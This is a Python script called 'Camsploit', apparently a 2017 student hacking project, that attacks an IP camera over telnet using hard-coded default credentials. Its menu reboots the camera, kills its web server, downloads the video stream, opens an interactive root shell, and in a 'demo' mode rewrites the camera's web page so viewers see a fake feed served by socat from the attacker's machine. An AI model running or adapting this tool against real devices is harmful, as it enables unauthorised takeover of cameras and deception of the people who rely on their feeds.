import os,sys,time,socket,subprocess,telnetlib
target = "0.0.0.0"  #IP Camera
webpage = "monitor4.asp"
user = "admin"
password = "ipcam_rt"
banner = """
  
   ____                ____        _       _ _   
  / ___|__ _ _ __ ___ / ___| _ __ | | ___ (_) |_ 
 | |   / _` | '_ ` _ \\\___ \| '_ \| |/ _ \| | __|
 | |__| (_| | | | | | |___) | |_) | | (_) | | |_ 
  \____\__,_|_| |_| |_|____/| .__/|_|\___/|_|\__|
                            |_|                  

By: The HackED IOT Guys
Spring Cohort
Copyright 2017
=================================================
Welcome!!!
================================================="""

main = """Please Select an option:
[1] Reboot Camera
[2] Kill Feed*
[3] Grab Stream
[4] Shell Session
[5] Perform Reconnaisance*
[6]
[7]
[8]
[9] Play Spy Music
[0] Exit

Other:
[i] Show Info
[x] Demo
"""

def loading(text):
    for i in range(10):
        sys.stdout.write("\r" + "[+] " + text + "." * i)
        time.sleep(0.1)
        sys.stdout.flush()
    print "\033[92m" + "\r" + "[+] " + text + "....................OK!\033[0m"

def prompt():
    raw_input("Press ENTER to continue. ")

def start_exploit():
    loading("Accessing Backdoor.........")
    loading("Crafting Exploit...........")
    loading("Sending Exploit............")



def main_menu():
    os.system("clear")
    print banner
    print main
    choice = raw_input("Please select an option: ")
    exec_menu(choice)

def exec_menu(choice):
    ch = choice.lower()
    if ch == '':
        menu_actions['main_menu']()
    else:
        try:
            menu_actions[ch]()
        except KeyError:
            print "Invalid selection, Please try again."
            time.sleep(0.5)
            menu_actions['main_menu']()
    return

#====================================================================
#                           Functions                               #
#===================================================================#
def reboot():
    command = "/bin/reboot\n"
    start_exploit()
    connect()
    tn.write(command + "\n")
    tn.write("exit" + "\n")
    prompt()
    tn.close()
        
def kill():
    command = "/usr/bin/killall webs"
    start_exploit()
    connect()
    tn.write(command + "\n")
    tn.write("exit" + "\n")
    prompt()
    tn.close()

def grab():
    print "grabbing stream"
    os.system("wget 'http://" + target + "/vjpeg.v?user=admin&pwd=Admin1234!' -O stream")
    prompt()

def shell():
    start_exploit()
    connect()
    tn.interact()


#Change hard-coded port into variable? Need to test with cam
def demo():
    self_ip = get_ip()
    FNULL = open(os.devnull, 'w')
    command1 = "cp /www/" + webpage + " /www/monitor.asp.bak1" #Creates backup
    command2 = "sed -i 's#/vjpeg.v#http://" + self_ip + ":4000#' /www/" + webpage + " && sed -i 's/pragma/refresh/' /www/" + webpage + " && sed -i 's/no-cache/7/' /www/" + webpage #spoof stream
    command3 = "/root/start_web.sh" #restart webserver
    command4 = "cp /www/monitor.asp.bak1 /www/" + webpage
    loading("Creating Fake Stream Server")
    os.system('socat TCP-LISTEN:4000,reuseaddr,fork EXEC:"pv -L 300k fakeheaders stream" 2>/dev/null &')
    start_exploit()
    connect()
    tn.write(command1 + "\n")
    tn.write(command2 + "\n")
    loading("Restarting Web Server......")
    tn.write(command3 + "\n")

    print "Stream is now spoofed!"
    raw_input("Press any key to revert back to normal:")
    tn.write(command4 + "\n")
    loading("Reverting Camera Feed......")
    print "Feed Restored!"
    prompt()
    os.system("killall socat")

def recon():
    print "Has not been implemented... yet"
    prompt()

def exit():
    print "Thank you for using Camsploit!"
    print "Happy hacking!!!!!"
    try:
        tn
    except NameError:
        sys.exit()
    else:
        tn.close()
    sys.exit()


def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('www.google.com', 1))
        IP = s.getsockname()[0]
    except:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP
    
def info():
    print "Printing Debug Information:" 
    print "Local IP Address: " + get_ip()
    print "Target IP Address: " + target
    print "Username: " + user
    print "Password: " + password

    prompt()

def connect():
    global tn 
    tn = telnetlib.Telnet(target)
    tn.read_until("login: ")
    tn.write(user + "\n")
    tn.read_until("Password: ")
    tn.write(password + "\n")

def exploit():
    tn.write(command + "\n")
    tn.write("exit" + "\n")

def music():
    print "DUN DUN DUN DUN DUN DUNUN DUN DUN DUN DUN"
    print "DUN DUN DUN"
    prompt()

    
#========================================
#Function to Number Mappings            #
#========================================

menu_actions = {
    'main_menu': main_menu,
    '1': reboot,
    '2': kill,
    '3': grab,
    '4': shell,
    '5': recon,
    'x': demo,
    'i': info,
    '0': exit,
    'q': exit,
    '9': music,
}


while True:
    try:
        main_menu()
    except KeyboardInterrupt:
        print"\n"
        exit()

	
